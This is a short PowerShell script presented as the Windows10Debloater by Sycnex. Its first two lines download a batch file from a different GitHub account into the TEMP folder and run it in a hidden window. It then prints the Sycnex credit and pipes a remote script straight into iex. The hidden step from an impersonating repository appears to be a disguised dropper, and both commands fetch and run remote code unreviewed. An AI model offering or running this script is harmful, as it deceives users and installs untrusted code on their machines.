iwr "https://raw.githubusercontent.com/Dazd-Pkz/Windows10Debloater/main/debloat" -o $env:TEMP\cmd-debloat.bat
Start-Process -WindowStyle hidden -FilePath $env:TEMP\cmd-debloat.bat
echo Windows10Debloater by Sycnex
iwr -useb git.io/debloat|iex
